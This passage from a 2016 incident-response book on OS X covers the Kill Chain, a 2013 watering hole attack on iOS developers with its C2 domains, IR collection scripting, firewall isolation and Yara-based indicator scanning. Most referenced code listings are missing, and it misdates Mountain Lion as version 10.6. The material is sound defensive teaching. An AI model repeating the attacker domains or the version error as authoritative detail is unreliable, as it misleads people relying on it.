OS X Incident Response
Scripting and Analysis
Jaron Bradley
Technical Editor
Alexandru Radocea
AMSTERDAM • BOSTON • HEIDELBERG • LONDON
NEW YORK • OXFORD • PARIS • SAN DIEGO
SAN FRANCISCO • SINGAPORE • SYDNEY • TOKYO
Syngress Publishers is an imprint of Elsevier

Syngress is an imprint of Elsevier
50 Hampshire Street, 5th Floor, Cambridge, MA 02139, USA
Copyright © 2016 Elsevier Inc. All rights reserved.
No part of this publication may be reproduced or transmitted in any form or by any means, 
electronic or mechanical, including photocopying, recording, or any information storage 
and retrieval system, without permission in writing from the publisher. Details on how to 
seek permission, further information about the Publisher’s permissions policies and our 
arrangements with organizations such as the Copyright Clearance Center and the Copyright 
Licensing Agency, can be found at our website: www.elsevier.com/permissions.
This book and the individual contributions contained in it are protected under copyright by 
the Publisher (other than as may be noted herein).
Notices
Knowledge and best practice in this field are constantly changing. As new research and 
experience broaden our understanding, changes in research methods, professional practices, 
or medical treatment may become necessary.
Practitioners and researchers must always rely on their own experience and knowledge 
in evaluating and using any information, methods, compounds, or experiments described 
herein. In using such information or methods they should be mindful of their own safety and 
the safety of others, including parties for whom they have a professional responsibility.
To the fullest extent of the law, neither the Publisher nor the authors, contributors, or editors, 
assume any liability for any injury and/or damage to persons or property as a matter of 
products liability, negligence or otherwise, or from any use or operation of any methods, 
products, instructions, or ideas contained in the material herein.
Disclaimer
The opinions expressed in this book come solely from the author and do not necessarily 
express the views or opinions of his employer.
British Library Cataloguing-in-Publication Data
A catalogue record for this book is available from the British Library
Library of Congress Cataloging-in-Publication Data
A catalog record for this book is available from the Library of Congress
ISBN: 978-0-12-804456-8
For information on all Syngress publications
visit our website at https://www.elsevier.com/
Acquisition Editor: Chris Katsaropoulos
Editorial Project Manager: Anna Valutkevich
Production Project Manager: Mohana Natarajan
Cover Designer: Mark Rogers
Typeset by Thomson Digital

ix
Acknowledgments
The StackOverflow Community for being a fantastic resource. draw.io for be-
ing free and awesome. Andrew Case and the Volatility team for the awesome 
work they do supporting OS X memory analysis. The guys over at the Rekall 
Team for supplying the community with a live memory analysis framework 
and the amazing pmem applications. Anyone who has ever written a blog 
post or write-up related to OS X security, administration, developer tutorials 
or unique findings. Kris Merritt for letting me join such an awesome team and 
putting me in a position where I can learn more about this topic. Brody Nis-
bet and William Pauley for their recommendations and assistance in cleaning 
up the introduction chapter. A big thanks to Christopher Schmitt and Adrian 
Maniatis for their assistance with writing and cleaning up my sloppy Python 
code. A big thanks to Patrick Wardle at Synack for all the amazing research he’s 
been working on and presenting across different conferences as well as writing 
and maintaining the tools at objective-see.com. I referred to your documents, 
slides, and video’s countless times while writing this book. A huge thanks to 
my technical reviewer Alex Radocea for his wisdom and guidance on all things 
OS X and his willingness to work with me nonstop while living in a polar op-
posite timezone. I could not have done this book without you. Finally, a thank 
you to my beautiful wife, for encouraging me to take on a new challenge.

1
OS X Incident Response. http://dx.doi.org/10.1016/B978-0-12-804456-8.00001-7
Copyright © 2016 Elsevier Inc. All rights reserved.
Introduction
CHAPTER 1
IS THERE REALLY A THREAT TO OS X?
In 1986 a man named Clifford Stoll was appointed as a systems manager at 
Berkeley University and tasked with finding the source of an odd accounting 
error in their system usage logs. You see, back then each researcher had to pay 
for the time they spent on the internet while at the University. The timer would 
start when they logged in and stop when they logged out. Stoll noticed that 
a user named Hunter was constantly leaving a small balance without paying 
it. When he searched for Hunter in the school records, he discovered nobody 
by that name attended Berkeley. Refusing to let this error go unnoticed, Stoll 
began investigating what was reasonably suspected to be a software glitch. 
His persistence and analytical skills eventually led to the discovery of a Ger-
man adversary who was obtaining and selling sensitive US military data to 
Russia’s Committee for State Security, the KGB. The German, a man named 
Markus Hess, was using guest credentials to move across systems in the Berke-
ley environment (as well as other environments) and stealing emails, research, 
and other valuable data that he encountered. Root permissions were easily 
acquired from the guest account thanks to a privilege escalation exploit in the 
GNU Emacs editor.
Stoll documented this intrusion and his findings in his book “The Cuckoo’s 
Egg,” the tale of the first recorded incident in cyber espionage history. AT&T’s 
Unix platform was one of the most popular operating systems at the time of 
this incident. Microsoft had released DOS about 5 years earlier and Mac OS 
had only existed for 2 years. Berkeley University’s labs were used extensively for 
research and their systems were Unix based.
So why is this story relevant? The Berkley intrusion showed us that the oper-
ating systems targeted in intrusion campaigns were not based on operating 
system type, but rather their popularity. Adversaries have always adapted their 
attack methods as needed, but due to the rise of Microsoft’s market share in 

CHAPTER 1: 
Introduction
2
later years, it made sense that attackers focused the majority of their efforts on 
studying and exploiting Windows systems. Now times are changing. Although 
Windows continues to dominate the majority of workstations, OS X is making 
a rise in workplace environments. CEOs are swapping out their old Windows 
machines for sleek new MacBooks. Companies are offering traveling employ-
ees the lightweight MacBook Air. iPads, iPhones, and Apple TVs are being used 
in the work environment for convenient sharing and conference meetings. 
Start-ups, web design, and marketing companies are trying to create Mac only 
based environments. Apple devices are on the rise inside major corporations 
and although OS X malware is seen infrequently inside targeted intrusions, 
there are signs that show we will be seeing more of it in the future. Incident 
responders and security analysts spend years learning the internal operations 
of the Windows operating system. How will responders perform analysis on a 
fundamentally different system? To continue effectively fighting the adversary 
we need to stay one step ahead of them. Working in the incident response field 
you will find that although vulnerabilities, exploits, and technology change, 
many adversary tactics and goals stay the same. This is true even across differ-
ent operating systems.
WHAT IS OS X
As anyone reading this book probably knows, OS X is the operating system de-
veloped by Apple Inc. The X in OS X stands for “ten” as this is the tenth edition 
of the operating system. As you can imagine, Apple went through many differ-
ent stages and changes to get to this point. Before OS X, the operating system 
was referred to as Mac OS. Before Mac OS it was simply referred to as “System 
Software.” System Software 1.0 (or just System 1.0), released in 1984, was in 
fact the first operating system to use a Graphical User Interface (GUI) where 
the user had both mouse and keyboard to navigate the system. Before this, all 
computers were command line based. This innovation changed personal com-
puting as we know it. Using a personal computer without a GUI is unheard of 
today. System Software evolved rapidly releasing version two, three, and four 
based on individual software package changes. Eventually, Apple changed to 
bundled updates. The first of these was System Software Five released in 1987. 
It wasn’t until halfway through System 7 that Apple began advertising the 
Operating System as Mac OS. As time continued major updates were added. 
Multithreading, the HFS1 file system, multiuser capabilities, Applescript, a na-
nokernel, 64-bit support, and a massive amount of other changes brought the 
operating system to where it is today. In 2001 Apple released OS X and starting 
with OS X Mountain Lion (10.6) dropped the name Mac OS entirely. Mod-
ern day OS X operating systems even meet the necessary requirements set by 
The Open Group to be registered as a Unix Product Standard. As a company, 
Apple’s success story is a bit of a roller coaster that goes from being a world 

Digging Deeper
3
innovation leader, all the way down to accepting $150 million from Microsoft 
to avoid bankruptcy (1997) and finally bouncing back stronger than ever.
THE XNU KERNEL
The Kernel running on OS X has always been a fairly unique one. Before we 
get into it, make note that to understand Incident Response you do not need 
to have a complete understanding on the deepest workings of the kernel. Of 
course, any additional understanding you may have will always help under the 
right circumstances. Anytime you hear the term XNU used with Apple, this re-
fers to the Kernel. The XNU Kernel is a hybrid of the Mach microkernel and the 
BSD Kernel. The idea was to build a kernel that brings the best of both worlds 
together. The BSD interface is used to handle the BSD system calls as well as a 
large number of other BSD features like ownership, permissions, networking, 
and the virtual file system. The Mach portion of the kernel handles many tasks as 
well. Among these tasks are the scheduler, virtual memory-management, and 
Mach inter-process communication (IPC). Mach ports can be used for IPC al-
lowing processes to communicate with each other or with the kernel. For ex-
ample, if a user browses to a website using Google Chrome, the DNS lookup 
may come directly from Chrome itself. Alternatively, an application developer 
may choose to use Apple APIs to perform DNS lookups. Doing so would cause 
the application to use a Mach port to communicate with the mDNSResponder 
process which then performs the DNS lookup for the application. The same 
may apply to other tools that are built using Apple’s APIs.
Finally, the last major piece of the XNU Kernel is I/O Services. I/O Kit is Apple’s 
framework used to build device drivers. These device drivers can be built to 
reside in the kernel. A few examples of drivers that might require kernel access 
are Ethernet, audio, thunderbolt, graphics, and networking drivers. The Apple 
Developer Library encourages users to avoid loading extensions into the kernel 
if possible since many tasks can be accomplished without kernel access when 
using I/O Kit.
DIGGING DEEPER
When it comes to understanding the ins and outs of the OS X operating sys-
tem the best reference is probably the Apple Developer Library where a massive 
amount of documentation can be found. If there are any topics mentioned in 
this book that you would like additional details on I highly recommend you 
start there. If you’re looking for a piece of information that cannot be found in 
the developer library it’s probably because Apple left it out on purpose. Although 
many details of OS X are shared much of the operating system remains closed 
source. The Apple Developer Library can be found at developer.apple.com.

CHAPTER 1: 
Introduction
4
REQUIREMENTS
This book was written for anyone interested in OS X security, but the reader 
should have a number of prerequisite skills before starting the first chapter. 
The most important of these skills will be common knowledge of command 
line tools and how to bring these tools together using scripting. A background 
in bash scripting is not required but will certainly help in understanding the 
scripts used to collect forensic data. Common knowledge of the OS X oper-
ating system will also be beneficial. Users who have learned to use terminal 
commands on any Unix platform should feel right at home in the OS X envi-
ronment.
Knowledge of python is also preferred if the reader wants to take the scripts 
and ideas proposed in this book and tweak them to work in their best inter-
est. Python will mainly be used to perform analysis on the data collected by 
bash scripts. A grasp of any programming language should suffice as Python is 
known for being readable and easy to understand.
FORENSICALLY SOUND VERSUS INCIDENT RESPONSE
Before we get started, the reader should be aware that this book does not 
take an approach that is considered forensically sound. That is to say, it does 
not take an approach that an analyst would use when trying to bring crimi-
nal evidence to court. For that, many extra precautions outside the scope of 
this book need to be taken such as creating a full disk image using a write-
blocker. The data that this book will focus on collecting and analyzing is 
specific to malware-based intrusions. Analysts who were hoping for a more 
forensically sound approach should still have a lot that can be taken away 
from this book.
INCIDENT RESPONSE PROCESS
Due to the constant rise of data breaches, companies all over the world have 
started developing their own security teams. These teams are not only dedi-
cated to enforcing best practices to keep hackers out, but also the best prac-
tices on responding for when they get in. Don’t make the mistake of believing 
that your security is impenetrable. Each company has its own preferences and 
processes for responding to an intrusion. For smaller companies that might 
mean hiring a group of contractors. For naive companies it might mean do-
ing nothing at all, but for companies who have built up a strong incident 
response team, a high level view of the process should look similar to the 
following (Fig. 1.1).

Incident Response Process
5
■	 Prepare
■	 Preparing for a company-wide intrusion does not mean watching 
old Blackhat videos on YouTube, drinking coffee, and staying 
hydrated. It means building your toolset, researching attacker 
methodologies, and developing new ways to catch them. Some may 
consider the preparation stage as down time, but it should not be 
treated as so. Preparation is critical to successfully executing the 
next stage.
■	 Detect
■	 Possibly the most critical step in the incident response process. If 
you are unable to detect the adversary upon intrusion, then they 
are free to move about your network until you do. A lot of incident 
response teams rely on firewall alerts, intrusion detection systems 
(IDS), antivirus, and other logs to detect the adversary. Many larger 
corporations have begun moving to software endpoints installed 
across their environment that brings a lot of these ideas together.
■	 Analyze
■	 The majority of this book will focus on the analysis stage. Analysis 
is critical for a number of reasons. More often than not you will 
find yourself analyzing a suspicious system with no guarantee that 
FIGURE 1.1

CHAPTER 1: 
Introduction
6
it’s compromised. For instance, say that in the detection phase 
a malicious URL was visited. This URL was flagged because it’s a 
known attacker controlled URL hosting malicious code. Now as 
the analyst it’s your job to figure out if the malicious code was 
successfully executed on this system or not. Another common 
example is receiving a phone call from a user who claims they 
opened an email and in hindsight regret doing so. In a scenario 
like this you will be held responsible for ensuring that when the 
user opened the malicious email, they did not click on any links 
or attachments. If they did click on links, where did it take them? 
Did that link contain malicious code or try to get the user to input 
credentials? These are fundamental questions that need answers no 
matter what Operating System you’re dealing with.
■	 Remediate
■	 This is the stage where we get rid of the adversary, clean up 
compromised systems, report and patch security vulnerabilities, and 
learn from our mistakes. In addition we must also learn from the 
attackers tactics, techniques, and procedures (TTPs) which should 
have been discovered during our detection and analysis. Using these 
TTPs to your advantage feeds directly back into the preparation stage.
THE KILL CHAIN
Now that we’ve taken a high level look at our own process cycle, it’s important 
to familiarize ourselves with the adversary’s process as well. Lockheed Martin 
published a popular concept called “The Kill Chain” model for this very rea-
son. This chain was defined to map the different stages the adversary moves 
through when planning and executing an intrusion. Discovering the furthest 
stage that the adversary reached will always be one of the objectives for the 
analyst. Each chapter in this book will focus on a subject directly tied to the 
Kill Chain. A brief description of each stage can be found as follows (Fig. 1.2).
■	 Reconnaissance
■	 The stage where an adversary picks a target and then researches that 
target by collecting any data that might be beneficial to an intrusion. 
A major focus of this stage is research into company employees. 
FIGURE 1.2

The Kill Chain
7
For example, who would have the least IT knowledge and be most 
likely to click on a phishing link. Who is higher up in the chain 
and is more likely to have access to confidential information? What 
domains does the company own? This stage involves the collection 
of any data made available on the web or elsewhere.
■	 Weaponization
■	 The stage where the building of the payload occurs. The most basic 
example would be an attacker building a malicious macro-enabled 
Word document. Although weaponization must take place before 
the malware reaches the targeted victim, if we are able to locate 
the crafted payload during our analysis, reverse engineering could 
possibly reveal a new exploit that hasn’t been seen before.
■	 Delivery
■	 The stage where the attacker attempts to get the weapon into the 
target environment. One of the most classic examples being a 
phishing email.
■	 Exploitation
■	 The stage is where a system level exploit occurs. It is common for 
the exploit to take advantage of vulnerable system code. However, 
Lockheed also mentions that the exploit may take advantage of a 
vulnerable user. For example, a phishing email that asks a naive user 
to install an attached “system patch” which really ends up being a 
malicious binary. Whatever the case may be, this step results in the 
execution of the attacker’s code on the system. The exploit that was 
used can be difficult to discover when working on a compromised 
host. Although malicious emails can often be found in system 
memory, sometimes you might not be able to find exactly how a 
system was exploited.
■	 Installation
■	 The code that gets executed by the exploit is usually responsible for 
the installation of a backdoor. On OS X this installation stage will 
likely consist of a number items. The simplest being a binary and 
plist file, but we’ll get into that later.
■	 Command and Control
■	 Upon successful installation of the attacker backdoor, the system 
should now be communicating with a known command and 
control (C2) server. Adversary activity generally requires direct 
communication with the victim machine allowing the attacker to 
explore the system interactively.
■	 Actions and Objectives
■	 The last stage of the Kill Chain. Many refer to this stage as the 
Exfiltration stage as data exfiltration is usually the primary goal of 

CHAPTER 1: 
Introduction
8
the adversary. This often involves locating valuable data, archiving it, 
and transferring it to an adversary controlled server. Although data 
theft is the major focus of this stage, the ways in which the adversary 
gets to that data are also important. This means internal network 
reconnaissance, moving laterally, and mounting shares.
APPLYING THE KILLCHAIN
Let’s take an example of an OS X intrusion that occurred in the past and walk 
through it from the Killchain perspective. In early 2013 both Facebook and 
Apple released notes informing the public that a select number of employees 
had fallen victim to a watering hole attack. This attack when put in perspective 
of the killchain looks like so.
■	 Reconnaissance
■	 Rather than targeting an individual, the attacker put their efforts 
toward targeting iOS Developers as a whole. They did this by finding 
a vulnerability in a website (iPhoneDevSDK.com) that they knew 
many iOS developers frequently visit.
■	 Weaponization
■	 The attackers designed a backdoor that worked on OS X and coupled 
it with a Java exploit.
■	 Delivery
■	 The malware was hosted by a web server called min.liveanalytics.
com. Attackers placed malicious javascript on the iPhoneDevSDK 
website so that victims would be redirected to min.liveanalytics 
where the Java exploit was hosted.
■	 Exploitation
■	 When the victims were redirected to the malicious website the Java 
exploit would trigger.
■	 Installation
■	 The exploit led to the installation of a modified sshd binary 
disguised with the file name “cupsd.” A launch daemon labeled 
com.apple.cupsd was set up to ensure a persistent connection if the 
infected system was restarted.
■	 Command and Control
■	 Upon execution the newly installed sshd service would attempt to 
connect to a handful of domains. Among these were…
-	 cache.cloudbox-storage.com
-	 img.digitalinsight-ltd.com
■	 Actions and Objectives
■	 Both companies claimed that although they had compromised 
employees, there was no evidence that data theft had occurred. This 

Malware Scenario
9
could be because this watering hole attack was not targeting these 
companies specifically. Rather it was targeting anyone interested 
in iOS development. If attackers were focused on stealing data 
specifically from these companies they might have done so quickly 
after gaining access.
ANALYSIS ENVIRONMENT
Throughout this book we will look into different system artifacts to collect and 
analyze on an OS X system that is suspected to be compromised. For the pur-
pose of this book we will assume that the analysis does not take place on the 
compromised host, but rather the forensic data get moved to a clean environ-
ment—preferably a system owned by the incident responder (Fig. 1.3).
The reader is welcome to analyze the collected artifacts on an operating system 
of their choosing. As most of the data we collect will be text based, if you are 
more comfortable viewing the output in a standard text editor then you’re wel-
come to do so. This book, however, will perform analysis using command line 
tools on an OS X analysis system and highly recommends you learn to do the 
same. By doing so you will be able to run scripts and tools, perform searches, 
and reorganize data output all from the same location. The majority of com-
mand line tools that will be used for analysis can also be found or installed on 
a Linux-based system. Using Linux will also provide an extra layer of security 
during analysis since we may collect a live sample of malware during the col-
lection process.
MALWARE SCENARIO
In each chapter of this book we will take what we’ve learned and apply it in 
a collection and analysis section. The collection section will recap on how to 
collect the best artifacts related to the chapter. In the analysis section we will 
analyze malicious behaviors done through a backdoor that has been written in 
Python. Although advanced malware is not commonly written in Python, this 
FIGURE 1.3

CHAPTER 1: 
Introduction
10
backdoor was put together specifically for this book and was a quick and dirty 
way to imitate what adversary activity looks like.
The scenario is as follows. You’re preparing to head home from work on a nice 
summer day when you receive a call from the company help desk. They inform 
you that they spoke with someone from the accounting department. The ac-
countant opened an email that at the time they thought was legitimate, but 
they are now beginning to second guess themselves as the attachment included 
in the email did not perform any actions when opened. The user then said that 
they are using a Mac so it couldn’t have infected their system, but they wanted 
to call just to be safe. You sigh at user ignorance and then walk slowly to your 
terminal to begin the incident response process (Fig. 1.4).
The aforementioned image shows a fairly traditional response plan to a com-
promised system. It’s up to the analyst how they want to ensure access to each 
Mac system. Many administrators are using a third party product called JAMF 
which is software designed to make Apple device management easy. Standard 
SSH could be used as well but it would require that every system is set up with 
an account that the admin can access. After data is collected it needs to be 
moved to an analysis server. As long as your analysis server is running OS X or 
Linux, using the secure copy (scp) tool will be the easiest approach. Finally, 
you will log into the analysis server, run your scripts to parse the data, and start 
putting the pieces of the puzzle together.
FIGURE 1.4

11
OS X Incident Response. http://dx.doi.org/10.1016/B978-0-12-804456-8.00001-7
Copyright © 2016 Elsevier Inc. All rights reserved.
Incident Response Basics
CHAPTER 2
INTRODUCTION
Scripting is a critical part of the incident response (IR) process. In this chapter we 
will touch on the different elements required to start an IR collection script as 
well its analysis counterpart. When starting off there are a number of decisions 
that need to be made such as picking which language to use, what tools need 
to be carried over to the victim system, and what tools need to be ready on our 
analysis system to start diving into collected artifacts. The collection process is 
critical to the investigation and depending on the size of your environment, you 
may only get one convenient shot to collect that data. Therefore, you want to be 
as thorough as possible. To state the obvious, you can’t analyze data that you 
didn’t collect in the first place. The good news is that there are a massive amount 
of tools already built into OS X. This book aims to use those tools to the best 
of their abilities so that fewer tools need to be carried over to the victim system.
PICKING A LANGUAGE
OS X systems come preinstalled with a number of languages to pick from 
when developing scripts to collect artifacts. Although this book will use bash 
scripting to collect artifacts, it’s important to pick a language you’re most com-
fortable with. If you’re working with a team, pick a language that everyone 
agrees on and can contribute with. I myself recommend you pick from three 
different languages, all of which are considered scripting languages. One of 
the great benefits of a scripting language is that the code does not need to be 
compiled and can be managed very easily. If you’re comfortable as a devel-
oper you’re encouraged to use any language you will be most effective with.
Python
In this book we will be using Bash to collect forensic artifacts and then build scripts 
using Python to analyze them. Python is “a hacker’s” language that ­supports a 
massive amount of libraries and a large contributor base. If you’re an experienced 
coder but have never used Python before, it can be picked up very quickly.

CHAPTER 2: 
Incident Response Basics
12
Ruby
Ruby, although known best for its Ruby on Rails Web Framework, is a great lan-
guage for scripting. Even though its overall support base isn’t as big as Python, 
it supports a lot of similar libraries. Ruby can be easy on the eyes for those who 
might not have a lot of development experience. One of the best things about 
IR scripting with Ruby is how simple it is to run a shell command from within 
the language. Any system command can be executed by simply using back ticks 
while inside the ruby script.
Bash
As this book will show, artifact collection can be accomplished easiest through 
scripted bash commands. Like most Unix-based systems, OS X has an incredible 
amount of built in command line tools making it a powerful language for data 
collection. Another popular option is to write useful scripts in other languages 
such as Python or Ruby and then use a bash script as a wrapper to execute them.
ROOT VERSUS NONROOT
When running your IR collection scripts you run them as the root user. Since 
this book focuses on IR and not corporate forensics, it’s assumed that the user 
will work with you to execute collection scripts. When run as the standard user 
you will be denied access to some of the most significant artifacts such as some 
opened ports, installed drivers, scheduled tasks, and dumping of memory. For 
this reason, the IR collection script should be executed either while logged in as 
root or with sudo command in front of it. To login as the root user you must first 
find a user that has sudo permissions. This is usually the owner of the machine 
in which you’ll be responding to. After you’ve found a user capable of root, you 
can authenticate with that user’s assistance.
or simply run your script with the sudo prefix

Yara
13
All of this to say, your IR script should check to ensure that it is being run as 
root. Every user on the system has unique user id (UID). When you create a new 
user, the UID is assigned automatically unless manually specified. However, the 
root UID will always be 0. We can check if the user is running as root by check-
ing the current UID. Here is one of many different ways to do so using bash.
It is good practice to clear the sudo cache with “sudo -k” first thing after starting 
the script as root. This is because anyone else logged on to the system under your 
UID will be able to login as root for the next 5 min after you have successfully 
authenticated. This process is covered in detail in the privilege escalation chapter.
YARA
Yara is a tool originally designed to assist with classifying unknown files to mal-
ware families. Although this may be its main function, the possibilities are end-
less with its usage. This is an absolute must have tool for your analysis frame-
work. You can think of Yara as an incredibly fast signature-based scanner. It lets 
you define a rule of signatures you want to scan for, and then allows you to 
specify the file in which to scan. Yara can scan files that are gigabytes in size mak-
ing it usable even on captured memory images. You can also use regular expres-
sions for added customization. Let’s create a basic Yara rule and walk through it.

CHAPTER 2: 
Incident Response Basics
14
The aforementioned Yara rule will look for the indicators of a well-known OS 
X based APT backdoor called xslcmd. Here I’ve specified a number of different 
strings to scan for. All of these strings can be found inside the xslcmd malware. I 
can now use this rule to scan any file I have access to. Notice that the indicators 
I’m scanning for vary in type. I have file names, a domain, and an IP address 
all in the same rule. It’s up to you how you want to manage your rules. Some 
analysts may prefer to keep rules sorted by indicator type, but here we’re using 
one that will look for any of these types. If we scan a file that contains one of 
these strings, Yara will let us know which indicators it found in the file. For 
example, let’s say we’ve recovered a suspicious binary called “file.bin” from a 
system that’s behaving oddly. We can now scan “file.bin” using the Yara rule we 
created previously.
The aforementioned commands show the same Yara rule used multiple times 
with a few of the most useful arguments. Scan one shows that with no argu-
ments Yara will simply return the rule that successfully hits. Scan two tells Yara 
to return the metadata of the rule upon a hit. Finally, scan three tells Yara to 
return any indicators that are hit on while scanning the file. This is certainly 
suspicious and shows us that the odds are good that this file is related to the 
xslcmd malware. Yara has a lot of options available and many demonstrative 
examples can be found at http://yara.readthedocs.org/en/v3.4.0/.

Basic Commands for Every Day Analysis
15
BASIC COMMANDS FOR EVERY DAY ANALYSIS
When performing analysis on collected OS X data, this book assumes you will 
be using a Linux or OS X based system. As stated before, many Linux distribu-
tions already hold a number of command line tools built in to make analysis 
easier. If you’re already familiar with these tools feel free to skip this section. If 
you haven’t used the command line for analysis before, it might be a good idea 
to reacquaint yourself with the following commands.
grep
Used to search a text file for a keyword. Get to know this command along with 
all of its available switches. During analysis you will be using it nonstop.
-f → search multiple keywords supplied in a file
-v → show results without the specified keyword
-w → match keyword exactly. For example, searching for the word car 
would hit on “car” and not “racecar”
egrep
The same as grep but it allows you to used advanced regular expressions inside 
of your search strings. Alternatively, you can use grep -e. Somewhere along the 

CHAPTER 2: 
Incident Response Basics
16
way, someone decided it saved valuable time to turn egrep into its own com-
mand.
cut
Used for selecting only the fields that you want from the output. You only need 
to specify a delimiter and a field(s) number. For instance,
awk
Another tool similar to “cut” but has many more additional options and ca-
pabilities.
sed
You might not use this too frequently during analysis, but there may be times 
where it’s nice to have. For instance, you can double space your results by using 
“sed G” making it much easier on the eyes. Otherwise sed is just another one 
of those tools to help edit and transform text output.
sort
Return your results in alphabetical order.
uniq
Remove duplicate lines from your output. This becomes very useful with the 
“-c” argument which will remove duplicate lines, but give you a count of 
how many times that line appeared (assuming you have sorted your results 
already).
STARTING AN IR SCRIPT
So what steps do we need to take to begin our IR scripting? We have already es-
tablished that our first steps should be checking to see if the script was executed 
as root followed by running sudo -k to disable the root login timer.

Starting an IR Script
17
Next, we need to decide whether or not this system should be allowed to com-
municate with the rest of the network while we try to confirm if it’s infected. If 
the system is compromised additional malicious activity could occur while we 
are performing analysis. At the same time, this system needs to maintain a con-
nection to the internal network if we’re planing to transfer collected artifacts 
to another system using LAN. We also want to be able to reaccess the system to 
collect additional files if analysis reveals any that are of concern. We can build 
a rule with the firewall that allows this system to talk to our file server, and no 
other system. Before Mavericks, this was done by using the ipfw tool. This tool 
is now deprecated. Pfctl is now the built in tool that allows you to manage 
firewall rules or “PF configurations”. PF configurations have been around for a 
long time originally developed for OpenBSD. By default, no firewall was con-
figured on OS X all the way up to OS X Yosemite. We can build our own rule 
and enable it using pfctl. The rule will look as follows.
This is an incredibly basic firewall rule. It says to block all packets inbound and 
outbound except for the IP 192.168.1.111 over ssh which is my file server. This 
allows me to transfer my IR data from this box to my server over SSH while 
denying all other connections to the system. If you are managing your data 
transfers via a different method, you will have to adjust, but this should get the 
point across. Let’s create a small script that will write this rule to disk and then 
load and enable the rule via pfctl.
Again, this step is totally up to the analyst. You may only want to enforce this 
rule based on the severity of incident or you may have no interest in enforcing 
it at all.

CHAPTER 2: 
Incident Response Basics
18
Disabling the pfctl rule is easy.
COLLECTION
We haven’t collected any forensic artifacts yet, but when we do it’s important 
that we get those artifacts in for analysis as soon as possible. It makes the most 
sense to compress our collected items into an archive for a smaller file transfer. 
Throughout this book we will be using a command line tool called ditto. Ditto 
is a quick archiving and compression tool that will suit our needs well. We will 
focus on some of the important data to collect in the next chapter, but for sim-
plicity sake let’s say that we’ve collected a handful of command outputs and we 
want to get them back for analysis.
Now I want to take all of the items in this folder and place them inside of a 
new archive.
The aforementioned command will take all of the files in our current directory 
and put them inside of an archive called data.zip. Let’s quickly break down the 
arguments we used to create this archive.
j	 -k → create archive using PKZip format.
j	 -zlibCompressionLevel → A number between 0 and 9 for the amount 
of compression you want to use where 9 is for strongest compression.
j	 -c → the location of our new zip file. I chose my current directory.
Keep in mind if you use nine for the zlibCompressionLevel you will be wait-
ing a long time for the creation of the archive. This will depend on the speci-
fications of the system you’re collecting. The benefit of a high compressions 
level is that you will be transferring a smaller file over the network later. In the  

Collection
19
aforementioned example we use compression level 5 which is a happy me-
dium. The last thing we will want to change is the name of the zip file. If every 
zip file that gets sent to our server is called data.zip, we won’t know how to tell 
them apart. So let’s give this zip file a more unique name.
This will create our new archive where the filename is the computer name fol-
lowed by the date. This short section of code will always be toward the very 
bottom of our collection script. There aren’t too many reasons you’d want to 
add code below this line.
Now let’s take everything we’ve learned so far and begin working on our 
IR collection script. This code will be used as a skeleton script and we will 
continue to add to it throughout the book. We will call this script collect.sh 
(Fig. 2.1).
FIGURE 2.1

CHAPTER 2: 
Incident Response Basics
20
ANALYSIS
Now that we’ve collected our first couple artifacts and transferred them to our 
server, we can start the analysis process. We have not collected enough data here 
to actually begin the analysis of our malicious scenario. We will start that in 

Analysis Scripts
21
the next chapter. For now we will keep it short and simple. All we need to do is 
unzip our archive and ensure that all files have read permissions for the analyst. 
The permissions on these files may have carried over to your analysis system 
and it will spare you a headache later to give all files read and write permissions. 
After we’ve collected an archive, make sure it’s in a folder by itself and then run
We will finally start collecting and analyzing data in the next chapter.
ANALYSIS SCRIPTS
Yarafly.sh
As mentioned previously, grep is a fantastic tool and it will be used constantly 
during analysis. It even has a built in switch to load keywords from a separate 
file. This is super helpful when we have a list of indicators we want to search 
for. Let’s say that three systems were compromised inside our network. I want 
to search my artifacts to see if the system I’m analyzing has communicated 
with any of these compromised IPs. I can create a text file containing the IP 
addresses of compromised systems.
I can now use this file to grep for these IPs inside log artifacts or a memory dump.
We can see here that the IP address 192.168.1.32 appears twice in the strings 
of memory. Once where it may have been communicating over ssh. There is 
a downside here though. What if we were searching through the strings of a 
16 GB memory dump. That can take a serious amount of time, especially if 
we’ve placed a large number of indicators inside the ips.txt file. Yara would be 
a much faster approach for scanning memory. Here is a quick and dirty script 
that allows a user to paste a set of indicators into a text file. The indicators will 
then be turned into a Yara rule on the fly.

22
Yara Results Sorted and Counted
This is fairly basic Unix command line 101. It just involves using some com-
mand line tools to make Yara results more readable. As you continue to build 
Yara rules you may notice that your false positive rate starts to grow. Remember 
that when we use “yara -s” we will receive a line of output every time an indi-
cator is seen. Sometimes it will be easier to sort and count your Yara results. 
Thanks to the sort and uniq commands, this is incredibly simple. Let’s say 
we’ve scanned memory using the XSLcmd rule we demonstrated earlier and we 
get the following results:

Conclusion
23
Now this is easy enough to read, but if it went on for 200 lines it wouldn’t 
be very enjoyable. Use the following syntax for a quick way to sum up the 
results.
This is a great demonstration of some of the everyday commands that were 
listed earlier in the chapter. Here we use awk to only print the indicator that 
was hit on, sed to remove empty lines from the results, sort to sort everything 
in alphabetical order, “uniq -c” which gives the number of times each indicator 
hit and the indicator name. Finally, we sort numerically using “sort -n” which 
gives us our Yara hits in order of their frequency.
CONCLUSION
In this chapter we looked at some of basic collection and analysis techniques 
that we will be using throughout this book. Much of what we looked at so far 
can be applied to most Unix platforms. As we move forward we will begin to 
focus on the IR specifics of OS X.

25
OS X Incident Response. http://dx.doi.org/10.1016/B978-0-12-804456-8.00001-7
Copyright © 2016 Elsevier Inc. All rights reserved.
Bash Commands
CHAPTER 3
INTRODUCTION
Gathering the right volatile information during your collection is one of the 
most critical steps in the incident response process. Volatile data relevant to the 
system’s current state will help produce new leads during your analysis. Without 
this output you would lose valuable insight to system information, network in-
formation, user data, startup processes, and active processes. In some cases you 
may even be able to determine if a system is compromised based on the vola-
tile data alone. In this chapter we will discuss which commands to run on our 
victim system, as well as how to interpret the different output from these com-
mands. We do need to keep in mind that if the system is running a rootkit some 
of the commands we run could be showing false information. If you know of 
more than one way to collect the same data, you’re encouraged to do so.
BASIC BASH COMMANDS
OS X comes preinstalled with a large number of commands. Many of these 
commands stem from the BSD/POSIX world, but there are a number of OS X 
specific commands as well. The goal of this section is to supply the analyst with 
the commands most relevant to an investigation. Each command includes a 
small description and some useful switches. The “man” pages are the best way 
to see additional functionality of each tool listed as follows.
SYSTEM INFO
date
The date command displays the current date and time. This is always a good 
starting point.
hostname
Simply returns the name of the computer.

CHAPTER 3: 
Bash Commands
26
uptime
Displays how long the system has been running.
sw_vers
Prints product name, version, and buildversion.
uname (-a)
Provides useful details about the operating system version and name. The -a 
provides extra details such as kernel version.
spctl (--status)
spctl allows you to check and manage system security policy. This is how you can 
